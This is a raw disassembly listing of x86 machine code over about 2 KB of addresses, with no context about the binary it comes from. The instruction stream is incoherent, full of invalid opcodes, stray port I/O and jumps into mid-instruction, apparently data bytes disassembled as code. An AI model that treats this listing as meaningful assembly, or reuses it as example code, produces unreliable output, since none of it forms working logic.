  48e81a:	ret    0x6829
  48e81d:	and    eax,0xa2be80c6
  48e822:	je     0x48e82d
  48e824:	dec    ebx
  48e825:	fstp   st(5)
  48e827:	or     al,0xfd
  48e829:	imul   esi
  48e82b:	out    0x11,eax
  48e82d:	mov    WORD PTR cs:[ebp-0x60f1a3cb],ds
  48e834:	jne    0x48e827
  48e836:	popa   
  48e837:	retf   0x55dd
  48e83a:	mov    bh,0xb3
  48e83c:	inc    ebp
  48e83d:	cmp    al,0xf4
  48e83f:	jo     0x48e7ca
  48e841:	or     al,0x2
  48e843:	pop    ebp
  48e844:	icebp  
  48e845:	mov    es,edi
  48e847:	fist   DWORD PTR [edi*4+0x2c01c740]
  48e84e:	sub    dh,BYTE PTR [eax-0x17]
  48e851:	jo     0x48e8cc
  48e853:	push   edi
  48e854:	fdiv   QWORD PTR [esi+esi*1+0x6c7ee94]
  48e85b:	and    eax,0xd707b5e8
  48e860:	imul   esp,eax,0x562359b8
  48e866:	(bad)  
  48e867:	icebp  
  48e868:	inc    edi
  48e869:	or     DWORD PTR [esi+0x1c],ebx
  48e86c:	pop    ecx
  48e86d:	stos   DWORD PTR es:[edi],eax
  48e86e:	pop    ebp
  48e86f:	pop    ebp
  48e870:	jmp    0x48e87f
  48e872:	jno    0x48e8b7
  48e874:	in     eax,0xac
  48e876:	aad    0x9
  48e878:	test   BYTE PTR ds:0xb725190f,cl
  48e87e:	out    0xa2,al
  48e880:	imul   esi
  48e882:	std    
  48e883:	jo     0x48e87b
  48e885:	add    eax,0xbf01984c
  48e88a:	inc    eax
  48e88b:	or     bh,BYTE PTR [esi-0x7cd38a85]
  48e891:	or     eax,0x3e9e0925
  48e896:	jmp    0x48e902
  48e898:	add    DWORD PTR [esi+0x345ecf8b],edi
  48e89e:	or     DWORD PTR ds:0x6ffd4271,eax
  48e8a4:	mov    esp,0x425bee68
  48e8a9:	scas   al,BYTE PTR es:[edi]
  48e8aa:	pop    eax
  48e8ab:	loope  0x48e84a
  48e8ad:	jle    0x48e8f6
  48e8af:	jmp    0xe8ac:0x68f5b059
  48e8b6:	idiv   BYTE PTR [ebx-0x766fb685]
  48e8bc:	jne    0x48e8df
  48e8be:	jno    0x48e8c1
  48e8c0:	int3   
  48e8c1:	jmp    FWORD PTR [eax+0x54]
  48e8c4:	je     0x48e8d7
  48e8c6:	mov    edi,0x90840934
  48e8cb:	adc    eax,0xa62a4468
  48e8d0:	lahf   
  48e8d1:	adc    DWORD PTR [eax],0x7
  48e8d4:	sbb    BYTE PTR ds:0xef5dd0ff,al
  48e8da:	mov    ebx,0x607bb4f
  48e8df:	push   ebx
  48e8e0:	pop    ecx
  48e8e1:	adc    BYTE PTR [edx+0x34],al
  48e8e4:	int3   
  48e8e5:	push   0x23
  48e8e7:	jb     0x48e8b0
  48e8e9:	pop    esi
  48e8ea:	lahf   
  48e8eb:	xlat   BYTE PTR ds:[ebx]
  48e8ec:	fistp  WORD PTR [ecx-0x3d]
  48e8ef:	adc    DWORD PTR [ecx-0x12],esi
  48e8f2:	pop    ecx
  48e8f3:	sbb    eax,0x10786812
  48e8f8:	pop    esp
  48e8f9:	push   esi
  48e8fa:	jbe    0x48e909
  48e8fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48e8fd:	or     ebp,DWORD PTR ds:[ebp-0x69]
  48e901:	jne    0x48e95b
  48e903:	dec    ecx
  48e904:	xchg   ecx,eax
  48e905:	lods   eax,DWORD PTR ds:[esi]
  48e906:	mov    eax,0x334473ac
  48e90b:	push   edx
  48e90c:	sbb    BYTE PTR [esi-0x47],bl
  48e90f:	pop    ebp
  48e910:	lods   eax,DWORD PTR ds:[esi]
  48e911:	add    BYTE PTR [ebp+0x1076865e],cl
  48e917:	sub    edi,DWORD PTR [esi+0x2f728ee]
  48e91d:	call   ecx
  48e91f:	loop   0x48e95c
  48e921:	stos   BYTE PTR es:[edi],al
  48e922:	jb     0x48e910
  48e924:	(bad)  ss:[edi-0x2f51c8eb]
  48e92b:	cmp    al,ch
  48e92d:	adc    bl,BYTE PTR [ecx]
  48e92f:	push   0xe0f95077
  48e934:	cmovs  esi,DWORD PTR [esi+0x6c]
  48e938:	or     bl,BYTE PTR [edi]
  48e93a:	and    eax,0x5dea55c0
  48e93f:	pop    ecx
  48e940:	shl    DWORD PTR [ebx+0x2a288c68],0x74
  48e947:	or     BYTE PTR [eax-0x1bc34726],bh
  48e94d:	push   es
  48e94e:	fist   DWORD PTR [eax+ebp*4-0x6f]
  48e952:	test   DWORD PTR [ecx+0x7d],eax
  48e955:	lds    edi,FWORD PTR [ebp+0x67]
  48e958:	sub    DWORD PTR [eax+0x70be3644],edi
  48e95e:	or     BYTE PTR [esi-0x8],cl
  48e961:	cmp    eax,esi
  48e963:	jae    0x48e974
  48e965:	mov    ebx,0xa0200df9
  48e96a:	loopne 0x48e93c
  48e96c:	add    edi,0xfffffffe
  48e96f:	jb     0x48e962
  48e971:	into   
  48e972:	ja     0x48e915
  48e974:	xor    BYTE PTR [eax+0x54],al
  48e977:	outs   dx,BYTE PTR ds:[esi]
  48e978:	shl    BYTE PTR [ebx+ebx*1+0x68],0x12
  48e97d:	xchg   edi,eax
  48e97e:	push   eax
  48e97f:	test   eax,0xa40cd369
  48e984:	add    ah,dl
  48e986:	xchg   ebx,eax
  48e987:	aaa    
  48e988:	pop    es
  48e989:	mov    eax,0x205d962a
  48e98e:	push   0x1bf8cf00
  48e993:	and    BYTE PTR [edi+edx*1],cl
  48e996:	pushf  
  48e997:	ss inc eax
  48e999:	cmp    DWORD PTR ds:0x152dbe80,eax
  48e99f:	mov    cl,0x8
  48e9a1:	pop    esp
  48e9a2:	dec    esp
  48e9a3:	jl     0x48e973
  48e9a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48e9a6:	jp     0x48e9a7
  48e9a8:	adc    al,0x8a
  48e9aa:	inc    ebp
  48e9ab:	adc    BYTE PTR [edx-0x397cf188],ah
  48e9b1:	sub    al,0x85
  48e9b3:	mov    al,ds:0x5c0b52c
  48e9b8:	ret    
  48e9b9:	fdiv   st(6),st
  48e9bb:	add    eax,0xc20ba41a
  48e9c0:	shr    BYTE PTR [esi+0x68],1
  48e9c3:	loope  0x48e9ad
  48e9c5:	(bad)  
  48e9c7:	fbld   TBYTE PTR [eax]
  48e9c9:	clc    
  48e9ca:	mov    DWORD PTR [ebp-0x2c],edi
  48e9cd:	fmul   QWORD PTR es:[edx]
  48e9d0:	fadd   DWORD PTR [ebx+0x7e1604ef]
  48e9d6:	call   DWORD PTR [eax+0x24]
  48e9d9:	xchg   esi,eax
  48e9da:	dec    ebx
  48e9db:	mov    ecx,0xed740739
  48e9e0:	sbb    BYTE PTR [esi],bh
  48e9e2:	push   DWORD PTR [edi]
  48e9e4:	ret    
  48e9e5:	fdivp  st(3),st
  48e9e7:	out    0x6d,eax
  48e9e9:	and    eax,0xd3ff0789
  48e9ee:	lahf   
  48e9ef:	xchg   ebx,eax
  48e9f0:	test   DWORD PTR [ecx],edi
  48e9f2:	ja     0x48e9ff
  48e9f4:	and    eax,0x5757a6d
  48e9f9:	push   cs
  48e9fa:	je     0x48ea0a
  48e9fc:	mov    ?,WORD PTR [esi+ecx*4-0x6de58c13]
  48ea03:	stos   DWORD PTR es:[edi],eax
  48ea04:	mov    edx,DWORD PTR [ebx+ebp*8]
  48ea07:	stos   DWORD PTR es:[edi],eax
  48ea08:	outs   dx,BYTE PTR ds:[esi]
  48ea09:	lahf   
  48ea0a:	(bad)  
  48ea0b:	mul    esi
  48ea0d:	in     al,0x90
  48ea0f:	sub    BYTE PTR [ecx+0xc9ce47d],al
  48ea15:	jae    0x48ea28
  48ea17:	add    BYTE PTR fs:[esp+ebp*2+0x14110db7],bh
  48ea1f:	add    al,0xeb
  48ea21:	out    0x40,al
  48ea23:	loopne 0x48e9c5
  48ea25:	loopne 0x48e9cb
  48ea27:	or     ch,BYTE PTR [ebx+edx*4]
  48ea2a:	pushf  
  48ea2b:	loopne 0x48ea0d
  48ea2d:	push   ebx
  48ea2e:	fsubr  DWORD PTR ds:0xc108f040
  48ea34:	lods   al,BYTE PTR ds:[esi]
  48ea35:	hlt    
  48ea36:	sub    edi,eax
  48ea38:	inc    edi
  48ea39:	cmp    BYTE PTR [esi+0x23c8eb38],bl
  48ea3f:	imul   ecx,DWORD PTR [ebx],0xffffff8c
  48ea42:	arpl   WORD PTR [edi+0x7e],si
  48ea45:	aas    
  48ea46:	je     0x48ea50
  48ea48:	dec    edi
  48ea49:	stos   DWORD PTR es:[edi],eax
  48ea4a:	pushf  
  48ea4b:	jmp    0x775:0x4ead8bac
  48ea52:	xchg   esi,eax
  48ea53:	or     DWORD PTR [ebx],eax
  48ea55:	cmp    esi,esi
  48ea57:	pop    ebp
  48ea58:	sub    eax,DWORD PTR [ecx]
  48ea5a:	dec    ebx
  48ea5b:	mov    edx,0x1f3d6bb0
  48ea60:	sbb    eax,0xecf0cb01
  48ea65:	jnp    0x48eace
  48ea67:	sbb    bh,BYTE PTR [eax-0x3]
  48ea6a:	imul   esi,DWORD PTR [edi+0x4e],0x706d9059
  48ea71:	mov    eax,0xec08df9e
  48ea76:	int3   
  48ea77:	pop    ss
  48ea78:	mov    ds:0xcec13a84,eax
  48ea7d:	nop
  48ea7e:	inc    edx
  48ea7f:	test   BYTE PTR [ecx+eiz*2+0x58],ch
  48ea83:	sub    ah,BYTE PTR [ebx]
  48ea85:	pop    esp
  48ea86:	pop    ebp
  48ea87:	sub    al,0xa8
  48ea89:	or     eax,0xdb83f054
  48ea8e:	sub    al,cl
  48ea90:	mov    bl,0x3c
  48ea92:	pop    ebx
  48ea93:	pop    edi
  48ea94:	fs ins DWORD PTR es:[edi],dx
  48ea96:	cmp    eax,0x5b6b4e96
  48ea9b:	inc    ebx
  48ea9c:	(bad)  
  48ea9e:	add    eax,0x16a67bc6
  48eaa3:	call   0x152d39c1
  48eaa8:	jo     0x48ea8e
  48eaaa:	xor    cl,BYTE PTR [edx+0x2366481a]
  48eab0:	adc    al,0xc0
  48eab2:	stos   BYTE PTR es:[edi],al
  48eab3:	(bad)  
  48eab4:	jp     0x48ea96
  48eab6:	push   ss
  48eab7:	push   ss
  48eab8:	outs   dx,BYTE PTR ds:[esi]
  48eab9:	dec    edx
  48eaba:	mov    eax,ds:0xab06e68
  48eabf:	stc    
  48eac0:	icebp  
  48eac1:	or     ecx,DWORD PTR [ebp-0x38747bdd]
  48eac7:	sub    eax,0x6c
  48eaca:	mov    bh,0x14
  48eacc:	and    esp,DWORD PTR [ebx]
  48eace:	and    ebp,DWORD PTR [ebp+0x6c9f0c48]
  48ead4:	and    DWORD PTR [ecx-0x679a05d8],ebx
  48eada:	adc    esp,ecx
  48eadc:	push   ebx
  48eadd:	add    BYTE PTR [edx+0x60],bl
  48eae0:	aaa    
  48eae1:	test   BYTE PTR [edi],al
  48eae3:	push   ds
  48eae4:	push   cs
  48eae5:	push   ecx
  48eae6:	adc    BYTE PTR [ecx],dh
  48eae8:	je     0x48eb18
  48eaea:	and    bh,dh
  48eaec:	mov    dh,0x18
  48eaee:	mov    dh,0x30
  48eaf0:	add    al,0x19
  48eaf2:	sub    esi,ebx
  48eaf4:	je     0x48eb09
  48eaf6:	xor    ebx,ebx
  48eaf8:	hlt    
  48eaf9:	lahf   
  48eafa:	ret    
  48eafb:	lea    ecx,[eax]
  48eafd:	jl     0x48eb21
  48eaff:	mov    al,BYTE PTR [edx+0x42b06ff]
  48eb05:	iret   
  48eb06:	enter  0xded5,0xeb
  48eb0a:	pop    ecx
  48eb0b:	add    DWORD PTR ds:0xcf02020c,edi
  48eb11:	jae    0x48eb8c
  48eb13:	and    eax,0x30303ed
  48eb18:	cmovle edx,edi
  48eb1b:	test   DWORD PTR ds:0xca45f60c,esp
  48eb21:	or     DWORD PTR [eax],ebp
  48eb23:	ins    DWORD PTR es:[edi],dx
  48eb24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48eb25:	jp     0x48eb62
  48eb27:	jno    0x48eabd
  48eb29:	sbb    edi,DWORD PTR [ecx+0x492e792]
  48eb2f:	add    al,0xa3
  48eb31:	add    eax,0x5c8c1c3c
  48eb36:	leave  
  48eb37:	add    eax,0x60e0684
  48eb3c:	and    bh,cl
  48eb3e:	enter  0x6595,0x7
  48eb42:	pop    es
  48eb43:	fisub  WORD PTR [ebp+0x8425cb9]
  48eb49:	or     BYTE PTR [eax],cl
  48eb4b:	xchg   edx,eax
  48eb4c:	or     BYTE PTR ds:0x1b4ae46f,ah
  48eb52:	or     DWORD PTR [ecx+ecx*1],edi
  48eb55:	pop    esp
  48eb56:	leave  
  48eb57:	jae    0x48ebd2
  48eb59:	cld    
  48eb5a:	add    cl,BYTE PTR [edx]
  48eb5c:	or     bl,ch
  48eb5e:	jns    0x48eae1
  48eb60:	sbb    al,0x8c
  48eb62:	or     ecx,DWORD PTR [esi]
  48eb64:	or     edi,DWORD PTR [edx+0x4bbc9502]
  48eb6a:	push   ebx
  48eb6b:	or     al,0xc
  48eb6d:	or     al,0x92
  48eb6f:	or     al,0x5c
  48eb71:	leave  
  48eb72:	ror    eax,0x93
  48eb75:	or     eax,0x23740d0e
  48eb7a:	push   edi
  48eb7b:	repnz mov WORD PTR [esi],cs
  48eb7e:	push   cs
  48eb7f:	push   ebp
  48eb80:	(bad)  
  48eb82:	jb     0x48eb05
  48eb84:	cmp    al,0xf
  48eb86:	xor    dl,BYTE PTR [eax]
  48eb88:	xchg   ecx,eax
  48eb89:	stos   DWORD PTR es:[edi],eax
  48eb8a:	mov    ebp,0x10591095
  48eb8f:	pop    esp
  48eb90:	adc    BYTE PTR [ebx-0x2a1a30f5],dl
  48eb96:	sahf   
  48eb97:	adc    DWORD PTR [ecx],edx
  48eb99:	cmp    eax,0x121201ec
  48eb9e:	repnz xor BYTE PTR [edx+0x25],dh
  48eba2:	int    0x13
  48eba4:	push   ds
  48eba5:	adc    ebp,DWORD PTR [esi]
  48eba7:	dec    ebp
  48eba8:	in     eax,0x5
  48ebaa:	stos   BYTE PTR es:[edi],al
  48ebab:	add    DWORD PTR [esp+edx*1],edx
  48ebae:	adc    al,0x7
  48ebb0:	and    edx,DWORD PTR [edi-0xe]
  48ebb3:	xchg   edx,eax
  48ebb4:	adc    al,0x83
  48ebb6:	adc    eax,0x33c9150e
  48ebbb:	jb     0x48ebe2
  48ebbd:	fs push ss
  48ebbf:	push   ss
  48ebc0:	add    eax,0x455c8cf2
  48ebc5:	pop    ss
  48ebc6:	pop    ss
  48ebc7:	in     al,0x5d
  48ebc9:	call   0x9218:0x181822cb
  48ebd0:	sbb    BYTE PTR [edi-0xe],dl
  48ebd3:	cs scas eax,DWORD PTR es:[edi]
  48ebd5:	sti    
  48ebd6:	add    BYTE PTR [ecx],bl
  48ebd8:	cmp    al,0x19
  48ebda:	fmul   st(0),st
  48ebdc:	xchg   ebp,eax
  48ebdd:	cmp    al,0x23
  48ebdf:	sbb    bl,BYTE PTR [edx]
  48ebe1:	mov    ebp,0xc1c81795
  48ebe6:	sbb    ecx,DWORD PTR [esi]
  48ebe8:	sbb    ebx,DWORD PTR [edx-0x1bd3e400]
  48ebee:	jns    0x48ec27
  48ebf0:	sbb    al,0x74
  48ebf2:	push   0x54
  48ebf4:	sbb    al,0x1c
  48ebf6:	push   ebx
  48ebf7:	repnz mov esp,0x34777046
  48ebfd:	sbb    eax,0x53795c1d
  48ec02:	repnz cmp al,0x1e
  48ec05:	push   ds
  48ec06:	inc    ecx
  48ec07:	neg    BYTE PTR [edi]
  48ec09:	clc    
  48ec0a:	inc    DWORD PTR [ebx]
  48ec0c:	in     al,0x1f
  48ec0e:	jne    0x48ec32
  48ec10:	add    eax,edx
  48ec12:	add    ecx,edx
  48ec14:	sub    edi,edx
  48ec16:	cmp    edi,edx
  48ec18:	jae    0xbfb32ee4
  48ec1e:	sbb    DWORD PTR [ebx+eax*1],edi
  48ec21:	mov    DWORD PTR [ebx],0x5eff83cf
  48ec27:	xchg   DWORD PTR [edx],ecx
  48ec29:	mov    ah,0x8b
  48ec2b:	shr    BYTE PTR [edx+ebp*1],0xb7
  48ec2f:	cs call 0xbc4447fb
  48ec35:	mov    esi,0x50c012a8
  48ec3a:	in     al,0x3b
  48ec3c:	push   ecx
  48ec3d:	in     al,0x74
  48ec3f:	imul   edx,DWORD PTR [esi-0x1bae2d0e],0xcf2a6953
  48ec49:	sub    esi,edx
  48ec4b:	rol    dl,cl
  48ec4d:	adc    dl,bh
  48ec4f:	sahf   
  48ec50:	addr16 dec edx
  48ec52:	fsubrp st(5),st
  48ec54:	xor    al,0xe5
  48ec56:	mov    esp,0x9e42e6e6
  48ec5b:	addr16 dec edx
  48ec5d:	mov    eax,ds:0x9b91e7e7
  48ec62:	jbe    0x48ec25
  48ec64:	aas    
  48ec65:	sub    ah,0xe8
  48ec68:	call   0x1d4c61e1
  48ec6d:	xchg   esi,eax
  48ec6e:	mov    esp,0x7b134ae8
  48ec73:	pop    esp
  48ec74:	and    edx,DWORD PTR [edi-0xe]
  48ec77:	sahf   
  48ec78:	call   0xe985d605
  48ec7d:	cmp    eax,0x95c8c1ea
  48ec82:	cmp    al,0xea
  48ec84:	push   ds
  48ec85:	jmp    0x48ec8b
  48ec87:	setbe  BYTE PTR [esi]
  48ec8a:	enter  0xa1eb,0x6a
  48ec8e:	xor    DWORD PTR [eax*1-0x131313f4],0xffffff91
  48ec96:	jb     0x48ecbd
  48ec98:	out    dx,eax
  48ec99:	repnz aad 0xfe
  48ec9c:	in     eax,dx
  48ec9d:	cmp    al,0xed
  48ec9f:	mov    dh,0x8c
  48eca1:	pop    esp
  48eca2:	leave  
  48eca3:	xor    ebp,esi
  48eca5:	out    dx,al
  48eca6:	xchg   edi,eax
  48eca7:	out    dx,eax
  48eca8:	out    0x72,al
  48ecaa:	sbb    DWORD PTR [esp+ecx*1],0x46f074ef
  48ecb1:	scas   al,BYTE PTR es:[edi]
  48ecb2:	fs nop
  48ecb4:	lock lock dec esi
  48ecb7:	icebp  
  48ecb8:	sahf   
  48ecb9:	xchg   ecx,eax
  48ecba:	sub    edi,DWORD PTR [ecx-0xf]
  48ecbd:	das    
  48ecbe:	repnz repnz nop
  48ecc1:	addr16 in al,0x4a
  48ecc4:	adc    bl,dh
  48ecc6:	repz jae 0x48ed33
  48ecc9:	sub    ch,BYTE PTR [edi]
  48eccb:	in     eax,dx
  48eccc:	std    
  48eccd:	hlt    
  48ecce:	hlt    
  48eccf:	imul   ecx,DWORD PTR [edx],0x3dabcb9e
  48ecd5:	pop    esp
  48ecd6:	hlt    
  48ecd7:	xchg   ebx,eax
  48ecd8:	(bad)  
  48ecd9:	std    
  48ecda:	cmc    
  48ecdb:	cmc    
  48ecdc:	and    eax,0x3dd5c8cf
  48ece1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48ece2:	div    dh
  48ece4:	add    eax,0x88723072
  48ece9:	test   DWORD PTR [esi],0x9a188cf7
  48ecef:	retf   
  48ecf0:	gs clc 
  48ecf2:	clc    
  48ecf3:	sbb    al,0xf8
  48ecf5:	leave  
  48ecf6:	xor    esi,DWORD PTR [edx+0x15]
  48ecf9:	or     eax,0x57f9f93f
  48ecfe:	repnz mov WORD PTR [eax+eiz*1-0x6],ds
  48ed03:	cli    
  48ed04:	add    DWORD PTR [ecx-0x7f],edi
  48ed07:	cmp    al,0x23
  48ed09:	sti    
  48ed0a:	sti    
  48ed0b:	fdivp  st(4),st
  48ed0d:	push   es
  48ed0e:	ss jb  0x48ed64
  48ed11:	cld    
  48ed12:	cld    
  48ed13:	je     0x48ed82
  48ed15:	cld    
  48ed16:	push   ebx
  48ed17:	push   esp
  48ed18:	aaa    
  48ed19:	and    eax,0xd290fdef
  48ed1e:	jne    0x48ed56
  48ed20:	mov    ch,bh
  48ed22:	xor    al,0xfd
  48ed24:	sbb    edi,esp
  48ed26:	or     BYTE PTR [edi+0x4b],ah
  48ed29:	sahf   
  48ed2a:	(bad)  
  48ed2b:	(bad)  
  48ed2c:	xor    eax,0xbcfc0474
  48ed31:	jge    0x48ed35
  48ed33:	retf   0x403c
  48ed36:	(bad)  
  48ed37:	cld    
  48ed38:	dec    ecx
  48ed39:	jmp    FWORD PTR [ebx]
  48ed3b:	ror    ecx,0x85
  48ed3e:	sar    BYTE PTR [edx+0x62],0x54
  48ed42:	faddp  st(1),st
  48ed44:	lea    eax,[ecx+ecx*1-0x40]
  48ed48:	xchg   edx,eax
  48ed49:	or     bl,BYTE PTR [ebx+0xc]
  48ed4c:	shl    BYTE PTR [esp+edi*4],cl
  48ed4f:	cmp    bl,BYTE PTR [esi]
  48ed51:	lods   eax,DWORD PTR ds:[esi]
  48ed52:	adc    ah,bl
  48ed54:	jecxz  0x48ed39
  48ed56:	xchg   edx,eax
  48ed57:	ja     0x48edd2
  48ed59:	adc    eax,0xe4fc3597
  48ed5e:	cmp    al,0xe4
  48ed60:	scas   eax,DWORD PTR es:[edi]
  48ed61:	jbe    0x48ed78
  48ed63:	mov    ecx,0xf73d8116
  48ed68:	sti    
  48ed69:	pop    esi
  48ed6a:	xor    BYTE PTR [ebp+ebp*1-0x77],bl
  48ed6e:	adc    edx,esp
  48ed70:	sti    
  48ed71:	push   0xffffff83
  48ed73:	adc    al,0x54
  48ed75:	out    0xc,eax
  48ed77:	out    0xe7,eax
  48ed79:	xchg   ecx,eax
  48ed7a:	repnz sub BYTE PTR [edx-0x1c],0xae
  48ed7f:	call   0x42447d1d
  48ed84:	mov    al,0xe4
  48ed86:	inc    ecx
  48ed87:	jo     0x48ed84
  48ed89:	or     eax,0x32e6906d
  48ed8e:	dec    ebp
  48ed8f:	jmp    0x48ed7c
  48ed91:	jmp    0x48ed24
  48ed93:	pop    esi
  48ed94:	push   eax
  48ed95:	lea    ebx,[edi+eiz*1-0x14]
  48ed99:	cdq    
  48ed9a:	or     bl,bh
  48ed9c:	or     BYTE PTR [esi-0x516b7c4],dl
  48eda2:	or     eax,0x272a6906
  48eda7:	(bad)  
  48eda8:	cli    
  48eda9:	out    dx,eax
  48edaa:	out    dx,eax
  48edab:	out    dx,eax
  48edac:	add    eax,0x91d5c8d5
  48edb1:	mov    al,ds:0xc96099f0
  48edb6:	and    esp,0xffffff81
  48edb9:	cli    
  48edba:	(bad)  
  48edbb:	cli    
  48edbc:	and    ch,cl
  48edbe:	or     BYTE PTR gs:0x72f3f33f,0x15
  48edc6:	mov    ecx,0x1991f3da
  48edcb:	xchg   esi,eax
  48edcc:	push   ecx
  48edcd:	leave  
  48edce:	and    esp,0x0
  48edd1:	cli    
  48edd2:	stc    
  48edd3:	(bad)  
  48edd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48edd6:	jb     0x48ed5a
  48edd8:	imul   ebp,DWORD PTR [ecx-0x48],0xfffffff9
  48eddc:	mul    esp
  48edde:	push   0x56
  48ede0:	xchg   edi,eax
  48ede1:	div    edi
  48ede3:	mov    bh,0x93
  48ede5:	xchg   ecx,eax
  48ede6:	inc    ecx
  48ede7:	repnz sub BYTE PTR [edx-0x8],0x99
  48edec:	jb     0x48ede7
  48edee:	cmp    ecx,eax
  48edf0:	mov    al,0xe4
  48edf2:	push   ebx
  48edf3:	stc    
  48edf4:	sbb    eax,0x36aef930
  48edf9:	dec    eax
  48edfa:	push   ebx
  48edfb:	sti    
  48edfc:	sti    
  48edfd:	sti    
  48edfe:	xchg   ecx,eax
  48edff:	or     dl,BYTE PTR [esi-0x3b90da9]
  48ee05:	cmp    al,0xfc
  48ee07:	jmp    0x48ee01
  48ee09:	stos   DWORD PTR es:[edi],eax
  48ee0a:	enter  0xaed5,0xa1
  48ee0e:	cmp    eax,0xbeaea9cc
  48ee13:	or     eax,DWORD PTR [edx+0x4945a90d]
  48ee19:	mov    al,0x40
  48ee1b:	jmp    0xa4f8:0x88702064
  48ee22:	pusha  
  48ee23:	lods   al,BYTE PTR es:[esi]
  48ee25:	mov    ecx,0xe24ce2df
  48ee2a:	push   esp
  48ee2b:	and    edx,DWORD PTR [edi+0x1b]
  48ee2e:	loop   0x48ee01
  48ee30:	arpl   bx,sp
  48ee32:	loope  0x48ee59
  48ee34:	setb   BYTE PTR [edi]
  48ee37:	inc    esp
  48ee38:	clc    
  48ee39:	and    eax,0x99c14f8
  48ee3e:	or     BYTE PTR [ebp+0x2],0xc
  48ee42:	out    0xcb,al
  48ee44:	stos   DWORD PTR es:[edi],eax
  48ee45:	or     eax,0x91e6e6d2
  48ee4a:	fdivr  st(7),st
  48ee4c:	pop    es
  48ee4d:	leave  
  48ee4e:	or     ebp,DWORD PTR [edx-0x8421e19]
  48ee54:	sahf   
  48ee55:	in     eax,0x4
  48ee57:	rcl    DWORD PTR [edx-0x884f209],0x9
  48ee5e:	sub    ch,BYTE PTR [ecx*2-0x6d6e1516]
  48ee65:	pop    ss
  48ee66:	push   esp
  48ee67:	retf   
  48ee68:	push   ebp
  48ee69:	mul    ecx
  48ee6b:	test   DWORD PTR ss:[ecx],0x170f2582
  48ee72:	test   DWORD PTR ds:0xca9a5854,0xeeeef6f4
  48ee7c:	xchg   ecx,eax
  48ee7d:	das    
  48ee7e:	test   al,0x96
  48ee80:	adc    ecx,esi
  48ee82:	mul    cl
  48ee84:	scas   eax,DWORD PTR es:[edi]
  48ee85:	test   BYTE PTR [ebx+ecx*2],0x1e
  48ee89:	and    al,0x90
  48ee8b:	test   BYTE PTR ds:0x132e6961,0x6d
  48ee92:	repnz repnz mov al,ds:0x91504e5a
  48ee99:	inc    edi
  48ee9a:	mul    cl
  48ee9c:	sub    eax,0x28bc9079
  48eea1:	test   BYTE PTR [ecx],0xf6
  48eea4:	rcl    BYTE PTR [esi+ecx*2+0x50],cl
  48eea8:	mov    ds:0xf6f6f5e6,eax
  48eead:	mov    edx,0x90c2a92b
  48eeb2:	jo     0x48ee73
  48eeb4:	dec    esp
  48eeb5:	leave  
  48eeb6:	xor    edi,DWORD PTR [ebx+0x3da0e1a2]
  48eebc:	clc    
  48eebd:	clc    
  48eebe:	xor    BYTE PTR [eax-0x73],bl
  48eec1:	pop    esp
  48eec2:	cmp    ecx,0xd2c21de9
  48eec8:	push   esp
  48eec9:	pop    esi
  48eeca:	pop    esi
  48eecb:	cmc    
  48eecc:	cli    
  48eecd:	cli    
  48eece:	inc    ecx
  48eecf:	mov    ch,0x9c
  48eed1:	mov    al,ds:0xe1f53891
  48eed6:	pop    eax
  48eed7:	repnz and BYTE PTR [ecx+0x19],bh
  48eedb:	cmc    
  48eedc:	cli    
  48eedd:	hlt    
  48eede:	pusha  
  48eedf:	rcr    DWORD PTR [ebx+0x44d70d20],0x66
  48eee6:	push   cs
  48eee7:	(bad)  
  48eee8:	data16 sahf 
  48eeea:	pop    edi
  48eeeb:	popf   
  48eeec:	xchg   esp,eax
  48eeed:	adc    dh,bl
  48eeef:	add    ax,0x7051
  48eef3:	stos   DWORD PTR es:[edi],eax
  48eef4:	adc    BYTE PTR [edx+0x75],0xbe
  48eef8:	adc    BYTE PTR [edi+0x1866578],dh
  48eefe:	push   0xc415cec0
  48ef03:	push   0xffffffcf
  48ef05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48ef06:	imul   ecx,DWORD PTR [eax-0x1e1e1e1f],0x6b82f2ff
  48ef10:	in     al,0x7a
  48ef12:	loop   0x48ef23
  48ef14:	pop    ebx
  48ef15:	hlt    
  48ef16:	shl    DWORD PTR [eax-0xbc3be1c],0x89
  48ef1d:	or     ecx,DWORD PTR [ebx+0x53]
  48ef20:	cmp    DWORD PTR [ecx],ebx
  48ef22:	hlt    
  48ef23:	in     eax,0xe5
  48ef25:	add    eax,0x78272d7
  48ef2a:	repz (bad) 
  48ef2e:	leave  
  48ef2f:	and    esp,0xffffffd4
  48ef32:	repz mov ch,0xf3
  48ef35:	xchg   esi,eax
  48ef36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48ef37:	jb     0x48eebb
  48ef39:	or     eax,0xe9e9f392
  48ef3e:	and    esp,0x6ca13504
  48ef44:	repz mov al,0xe4
  48ef47:	inc    ecx
  48ef48:	xlat   BYTE PTR ds:[ebx]
  48ef49:	dec    ebp
  48ef4a:	(bad)  
  48ef4d:	repz xchg esi,eax
  48ef4f:	out    0x32,al
  48ef51:	inc    ecx
  48ef52:	or     eax,0x81eded0b
  48ef57:	in     al,0x4
  48ef59:	xor    eax,0xb0f2e5a1
  48ef5e:	in     al,0x41
  48ef60:	xlat   BYTE PTR ds:[ebx]
  48ef61:	(bad)  
  48ef62:	repnz (bad) 
  48ef65:	repnz rcl BYTE PTR [ecx+0x39],cl
  48ef69:	inc    ecx
  48ef6a:	or     eax,0x38f1f284
  48ef6f:	icebp  
  48ef70:	leave  
  48ef71:	sub    ebp,DWORD PTR [ecx+0x5d70a2c6]
  48ef77:	repnz leave 
  48ef79:	sub    DWORD PTR [esi+0x11f23e03],0x1f
  48ef80:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48ef82:	jb     0x48ef06
  48ef84:	popa   
  48ef85:	sbb    eax,0xe4f5f1fc
  48ef8a:	add    al,0x35
  48ef8c:	xchg   esi,eax
  48ef8d:	cmc    
  48ef8e:	mov    eax,ds:0x6154f1d6
  48ef93:	leave  
  48ef94:	xor    DWORD PTR [edi+0x101cf1f1],0xf198392c
  48ef9e:	or     eax,0xa58d4175
  48efa3:	mov    ecx,0xd0a1f9f9
  48efa8:	jne    0x48efca
  48efaa:	cmp    DWORD PTR [edi-0xf],ecx
  48efad:	xor    cl,dh
  48efaf:	cmovle edx,DWORD PTR [eax]
  48efb2:	sub    al,0x79
  48efb4:	adc    ecx,esi
